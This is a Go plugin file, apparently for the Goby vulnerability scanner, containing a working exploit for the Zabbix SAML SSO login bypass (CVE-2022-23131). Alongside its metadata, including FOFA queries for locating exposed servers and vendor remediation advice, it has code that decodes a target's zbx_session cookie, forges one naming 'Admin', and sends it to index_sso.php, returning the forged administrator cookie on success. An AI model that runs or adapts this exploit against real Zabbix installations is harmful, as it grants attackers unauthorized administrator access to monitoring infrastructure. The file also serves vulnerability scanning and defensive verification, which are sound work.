package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Zabbix index_sso.php file Login Bypass Vulnerability (CVE-2022-23131)",
    "Description": "<p>Zabbix is an open source monitoring system. The system supports network monitoring, server monitoring, cloud monitoring and application monitoring, etc.</p><p>A login bypass vulnerability exists in Zabbix that arises when SAML SSO authentication is enabled (not default). An unauthenticated malicious attacker could exploit the vulnerability to escalate privileges and gain administrator access to the Zabbix frontend.</p>",
    "Impact": "<p>Zabbix has a login bypass vulnerability, which is due to SAML SSO authentication (not the default). A malicious unauthenticated attacker can exploit the vulnerability to elevate privileges and gain administrator access to the Zabbix front-end.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://support.zabbix.com/browse/ZBX-20350\">https://support.zabbix.com/browse/ZBX-20350</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "ZABBIX-Monitoring",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "Zabbix index_sso.php 文件身份验证绕过漏洞（CVE-2022-23131）",
            "Product": "ZABBIX-监控系统",
            "Description": "<p>Zabbix 是一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。</p><p>Zabbix存在登录绕过漏洞，该漏洞源于在启用 SAML SSO 身份验证（非默认）的情况下。 未经身份验证的恶意攻击者可利用漏洞来提升权限并获得对 Zabbix 前端的管理员访问权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://support.zabbix.com/browse/ZBX-20350\">https://support.zabbix.com/browse/ZBX-20350</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Zabbix存在登录绕过漏洞，该漏洞源于在启用 SAML SSO 身份验证（非默认）的情况下。 未经身份验证的恶意攻击者可利用漏洞来提升权限并获得对 Zabbix 前端的管理员访问权限。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Zabbix index_sso.php file Login Bypass Vulnerability (CVE-2022-23131)",
            "Product": "ZABBIX-Monitoring",
            "Description": "<p>Zabbix is an open source monitoring system. The system supports network monitoring, server monitoring, cloud monitoring and application monitoring, etc.</p><p>A login bypass vulnerability exists in Zabbix that arises when SAML SSO authentication is enabled (not default). An unauthenticated malicious attacker could exploit the vulnerability to escalate privileges and gain administrator access to the Zabbix frontend.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://support.zabbix.com/browse/ZBX-20350\">https://support.zabbix.com/browse/ZBX-20350</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Zabbix has a login bypass vulnerability, which is due to SAML SSO authentication (not the default). A malicious unauthenticated attacker can exploit the vulnerability to elevate privileges and gain administrator access to the Zabbix front-end.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "body=\"SAML\" && (banner=\"zbx_session=\" || header=\"zbx_session=\")",
    "GobyQuery": "body=\"SAML\" && (banner=\"zbx_session=\" || header=\"zbx_session=\")",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.zabbix.com/",
    "DisclosureDate": "2022-02-04",
    "References": [
        "http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202201-1030"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.0",
    "CVEIDs": [
        "CVE-2022-23131"
    ],
    "CNVD": [
        "CNVD-2022-08298"
    ],
    "CNNVD": [
        "CNNVD-202201-1030"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10256"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp1.StatusCode == 200 && regexp.MustCompile("zbx_session=(.*?);").MatchString(resp1.HeaderString.String()) {
				Zabbix_Cookie := regexp.MustCompile("zbx_session=(.*?);").FindStringSubmatch(resp1.HeaderString.String())
				Zabbix_CookieUrl, _ := url.QueryUnescape(Zabbix_Cookie[1])
				Zabbix_CookieBase64, _ := base64.StdEncoding.DecodeString(Zabbix_CookieUrl)
				Zabbix_Sessionid := regexp.MustCompile("\"sessionid\":\"(.*?)\",").FindStringSubmatch(string(Zabbix_CookieBase64))
				Zabbix_Sign := regexp.MustCompile("\"sign\":\"(.*?)\"}").FindStringSubmatch(string(Zabbix_CookieBase64))
				Zabbix_Cookie_bypass := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf(`{"saml_data": {"username_attribute": "Admin"}, "sessionid":"%s","sign":"%s"}`, Zabbix_Sessionid[1], Zabbix_Sign[1])))
				uri2 := "/index_sso.php"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Cookie", "zbx_session="+url.QueryEscape(Zabbix_Cookie_bypass))
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 302 && strings.Contains(resp2.HeaderString.String(), "zabbix.php?action=dashboard.view")
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 && regexp.MustCompile("zbx_session=(.*?);").MatchString(resp.HeaderString.String()) {
				Zabbix_Cookie := regexp.MustCompile("zbx_session=(.*?);").FindStringSubmatch(resp.HeaderString.String())
				Zabbix_CookieUrl, _ := url.QueryUnescape(Zabbix_Cookie[1])
				Zabbix_CookieBase64, _ := base64.StdEncoding.DecodeString(Zabbix_CookieUrl)
				Zabbix_Sessionid := regexp.MustCompile("\"sessionid\":\"(.*?)\",").FindStringSubmatch(string(Zabbix_CookieBase64))
				Zabbix_Sign := regexp.MustCompile("\"sign\":\"(.*?)\"}").FindStringSubmatch(string(Zabbix_CookieBase64))
				Zabbix_Cookie_bypass := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf(`{"saml_data": {"username_attribute": "Admin"}, "sessionid":"%s","sign":"%s"}`, Zabbix_Sessionid[1], Zabbix_Sign[1])))
				uri2 := "/index_sso.php"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Cookie", "zbx_session="+url.QueryEscape(Zabbix_Cookie_bypass))
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					if resp2.StatusCode == 302 && strings.Contains(resp2.HeaderString.String(), "zabbix.php?action=dashboard.view") {
						expResult.Output = "Cookie: zbx_session=" + url.QueryEscape(Zabbix_Cookie_bypass)
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
